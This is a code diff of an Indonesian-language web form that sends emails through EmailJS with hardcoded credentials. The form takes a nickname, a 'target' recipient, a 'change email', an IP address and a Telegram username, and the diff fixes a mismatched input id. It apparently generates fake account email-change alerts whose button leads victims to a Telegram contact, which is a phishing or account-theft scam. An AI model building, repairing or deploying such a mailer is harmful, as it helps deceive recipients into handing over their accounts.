@@ -91,8 +91,8 @@
                 <input type="text" id="nickname" placeholder="Contoh: Skywee" required>
             </div>
             <div class="form-group">
-                <label for="to-email">Email Penerima (Tujuan)</label>
-                <input type="email" id="to-email" placeholder="target@example.com" required>
+                <label for="recipient_email">Email Penerima (Tujuan)</label>
+                <input type="email" id="recipient_email" placeholder="target@example.com" required>
             </div>
             <hr style="border: none; border-top: 1px solid #eee; margin: 25px 0;">
             <div class="form-group">
@@ -117,8 +117,8 @@
         document.getElementById('email-form').addEventListener('submit', function(event) {
             event.preventDefault();
 
-            // --- ⚠️ EDIT DI BAWAH INI ⚠️ ---
-            // Masukkan kredensial EmailJS Anda di sini
+            // --- ⚠️ EDIT DI BAWAH INI JIKA PERLU ⚠️ ---
+            // Kredensial EmailJS Anda
             const serviceID = 'service_1u6cx2g';
             const templateID = 'template_kpwtj4j';
             const publicKey = 'pep2l72BvMbtR9Jdo';
@@ -130,7 +130,7 @@
 
             // Ambil semua nilai dari form
             const nickname = document.getElementById('nickname').value;
-            const toEmail = document.getElementById('to-email').value;
+            const toEmail = document.getElementById('recipient_email').value; // <<< INI YANG DIPERBAIKI
             const changeEmail = document.getElementById('change-email').value;
             const userIP = document.getElementById('user-ip').value;
             const telegramUser = document.getElementById('telegram-user').value;
@@ -151,7 +151,7 @@
                 nickname: nickname,
                 change_email: changeEmail,
                 user_ip: userIP,
-                button_link: fullTelegramLink, // Menggunakan link Telegram yang sudah dibuat
+                button_link: fullTelegramLink,
                 current_time: currentTime
             };
             
